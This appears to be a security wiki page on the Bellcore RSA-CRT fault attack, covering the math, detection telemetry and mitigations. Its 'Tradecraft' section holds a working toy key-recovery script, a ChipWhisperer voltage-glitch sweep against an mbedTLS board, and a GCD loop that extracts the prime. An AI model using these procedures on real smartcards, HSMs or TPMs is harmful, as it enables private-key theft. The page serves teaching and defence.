---
title: RSA fault attacks (Bellcore / CRT fault)
slug: rsa-fault-attacks
aliases: [bellcore-attack, rsa-crt-fault]
---
{% raw %}

A single corrupted bit during an RSA-CRT signature can cost you the private key. Boneh, DeMillo and Lipton showed in 1997 that if an implementation computes the signature via the Chinese Remainder Theorem (the default in every performance-oriented stack — OpenSSL, mbedTLS, BoringSSL, WolfSSL, every smartcard applet, every HSM firmware) and the device emits one faulty signature where exactly one of the two half-computations was disturbed, then a single GCD on the attacker's laptop factors the modulus. This is not academic: it has burned smartcards, payment terminals, TPMs, signed-boot SoCs, and at least three generations of "secure" HSMs. It shows up any time you can induce a glitch (clock, voltage, EM, laser, Rowhammer-adjacent) on a device that signs without verifying its own output. See [[applied-crypto]] and [[hardware-attacks-primer]] for the surrounding context.

## Mental model / How it works

RSA-CRT signing splits the expensive `s = m^d mod N` into two half-sized exponentiations modulo the primes `p` and `q`:

```
sp = m^(d mod p-1) mod p
sq = m^(d mod q-1) mod q
s  = CRT(sp, sq)        # via Garner's formula
```

This is ~4x faster than the straight `m^d mod N`. The catastrophic property: `s ≡ sp (mod p)` and `s ≡ sq (mod q)`.

Now suppose a fault flips a bit during the computation of `sq` only — `sp` is correct, `sq'` is garbage. The emitted faulty signature `s'` satisfies:

```
s'  ≡ sp  (mod p)     <- still correct mod p
s'  ≢ sq  (mod q)     <- wrong mod q
```

Raise to the public exponent `e`:

```
s'^e ≡ m  (mod p)
s'^e ≢ m  (mod q)
```

Therefore `p` divides `s'^e - m`, but `q` does not. One line of math finishes the job:

```
p = gcd(s'^e - m mod N, N)
```

You need: the message `m` (or its PKCS#1 / PSS encoded form `EM`), the public key `(N, e)`, and **one** faulty signature where the fault landed in exactly one CRT branch. That's it. No oracle, no repeat queries, no lattice. See [[crypto-implementation-bugs]] for sibling footguns and [[lattice-attacks-crypto-ctf]] for what you reach for when the GCD doesn't bite.

A toy demonstration in Python:

```python
from Crypto.Util.number import getPrime, GCD, inverse
p, q = getPrime(1024), getPrime(1024)
N, e, d = p*q, 65537, inverse(65537, (p-1)*(q-1))
m  = int.from_bytes(b"\x00\x01" + b"\xff"*200 + b"\x00" + b"hash", "big")
dp, dq = d % (p-1), d % (q-1)
sp, sq = pow(m, dp, p), pow(m, dq, q)
sq_bad = sq ^ 1                                   # one-bit fault in sq
qinv   = inverse(q, p)
s_bad  = (sq_bad + q * ((sp - sq_bad) * qinv % p)) % N
print(GCD(pow(s_bad, e, N) - m, N) == p)          # True
```

Two milliseconds of CPU recover a 2048-bit key from a single bad output.

## Tradecraft / Hands-on

The collection problem is the whole problem. Pick your injection vector by target class:

- **Smartcards / JavaCard applets / SIM**: clock glitching with a Riscure Inspector or a homemade FPGA on the ISO7816 CLK line during the modular exponentiation.
- **STM32 / nRF / ESP class MCUs running mbedTLS or WolfSSL**: voltage glitching with **ChipWhisperer-Husky** or **ChipWhisperer-Lite + CW308 UFO**, GlitchKit-AVR for AVRs.
- **Application processors (TEE / OP-TEE / SEV / SGX)**: software-induced faults — Plundervolt (`MSR 0x150`), VoltJockey, CLKSCREW, and the SGX/SEV undervolting families.
- **DRAM-backed key material**: Rowhammer-style bit flips against the in-memory CRT intermediate.

Minimum ChipWhisperer recipe against an STM32F3 running mbedTLS RSA-2048 signing:

```bash
git clone https://github.com/newaetech/chipwhisperer
cd chipwhisperer && pip install -e .
# flash victim
cd hardware/victims/firmware/simpleserial-rsa
make PLATFORM=CW308_STM32F3 CRYPTO_TARGET=MBEDTLS
```

```python
import chipwhisperer as cw
scope, target = cw.scope(), cw.target(scope)
scope.glitch.clk_src      = "clkgen"
scope.glitch.output       = "glitch_only"
scope.glitch.trigger_src  = "ext_single"
scope.io.hs2              = "glitch"
for width in range(2, 12):
    for offset in range(-40, 40):
        for ext_off in range(7000, 12000, 5):     # sweep into the CRT exp
            scope.glitch.width, scope.glitch.offset = width, offset
            scope.glitch.ext_offset = ext_off
            scope.arm()
            target.simpleserial_write('t', msg)
            sig = target.simpleserial_read('r', 256, timeout=2000)
            if sig and pow(int.from_bytes(sig,'big'), e, N) != m:
                save(width, offset, ext_off, sig)  # candidate faulty sig
```

Sweep until `pow(s, e, N) != m`. Then feed every candidate to:

```python
from math import gcd
for s in candidates:
    p = gcd(pow(s, e, N) - m, N)
    if 1 < p < N: print("pwned", hex(p)); break
```

A useful generalisation when the message is PSS-padded and you cannot reproduce `m` deterministically: collect two faulty signatures `s1, s2` over distinct messages, take `gcd(s1^e - m1, s2^e - m2, N)`. Lenstra's variant tolerates faults in `dp` or `dq` themselves and still factors with one signature.

Useful references on the bench: `pycryptodome` for math, `gmpy2` for fast 2048-bit GCDs, `python-ecdsa` only as a counter-example (ECDSA has its own nonce-reuse story — see [[side-channel-attacks-primer]]).

## Detection / Telemetry

Defenders rarely see "an RSA fault" — they see weird stuff around the signing boundary. What to hunt:

- **Sign-verify mismatch counters**: any modern crypto lib (OpenSSL since 0.9.7h, mbedTLS with `MBEDTLS_RSA_NO_CRT` off but `RSA_Blinding` on) verifies the signature against `e` before returning. A spiking counter of "verify-after-sign failed, refusing output" on an HSM is exactly the Bellcore signal. Forward HSM syslog (`Thales payShield`, `Utimaco`, `Entrust nShield` audit logs) into SIEM and alert on `RSAVerify=FAIL`, `SelfTest=FAIL`, `KAT_FAIL`.
- **TPM event log**: `TPM_RC_FAILURE (0x101)` and `TPM_RC_NV_RATE` bursts often precede or follow physical tamper attempts — correlate with [[tpm-extraction-attacks]].
- **Power-rail anomalies**: on instrumented boards, monitor voltage droop / brown-out resets (`PMIC` events, `PWR_FLAG_BORRSTF`). Repeated brown-outs during signing is glitch tradecraft.
- **EDR / host telemetry**: Plundervolt-style attacks need `wrmsr 0x150` — flag with `auditd -w /dev/cpu/*/msr` and Sysmon `RawAccessRead` of `\Device\PhysicalMemory`. Block `msr.ko` outside lab images.
- **Field returns**: chip decapsulation, FIB marks, missing passivation, scorched die — physical IR is the last line. Train RMA on photographs.

A practical SIEM hunt:

```spl
index=hsm  ( event_id=KAT_FAIL OR event_id=SIGN_VERIFY_MISMATCH )
| bin _time span=1m | stats count by host event_id
| where count > 2
```

## OPSEC pitfalls or common mistakes

- Assuming "we use OpenSSL so we're safe" — RSA-CRT with `RSA_FLAG_NO_BLINDING` and an old build path skips the verify-after-sign on private-only keys. Audit `RSA_check_key` and `BN_BLINDING` are actually live.
- Disabling CRT for "safety" and forgetting it triples signing latency on every TLS handshake — engineers re-enable it in the next sprint. Make it a compile-time flag tied to FIPS mode.
- Believing PSS or full-domain hashing defeats the attack. It doesn't — as long as you (the attacker) know the encoded `m`, the GCD still factors `N`. Padding is irrelevant to Bellcore.
- Throwing away faulty signatures at the device boundary "to be safe". If your firmware emits *anything* derived from the faulty CRT branch (an error code byte, a truncated hash, a debug print of an intermediate), Lenstra-style variants can still recover the key.
- Glitching too hard: a wide-amplitude glitch resets the chip or corrupts both CRT branches. You want surgical single-branch corruption — narrow width, tight offset, low repeat-rate. Fault rate ~1-5% is the sweet spot; 50% means you're breaking everything and learning nothing.

## References

- https://link.springer.com/chapter/10.1007/3-540-69053-0_4 — Boneh, DeMillo, Lipton, "On the Importance of Checking Cryptographic Protocols for Faults" (Eurocrypt 1997)
- https://eprint.iacr.org/2012/553 — Lenstra-style single-fault variants and survey
- https://chipwhisperer.readthedocs.io/en/latest/tutorials.html — NewAE ChipWhisperer fault-injection tutorials
- https://plundervolt.com/ — Murdock et al., software-undervolting fault attacks on SGX
- https://www.openssl.org/docs/man3.0/man3/RSA_blinding_on.html — OpenSSL blinding and verify-after-sign API
- https://eprint.iacr.org/2002/073 — Aumuller et al., "Fault attacks on RSA with CRT: concrete results and practical countermeasures"

See also: [[applied-crypto]] · [[lattice-attacks-crypto-ctf]] · [[side-channel-attacks-primer]] · [[crypto-implementation-bugs]] · [[hardware-attacks-primer]] · [[tpm-extraction-attacks]]

{% endraw %}
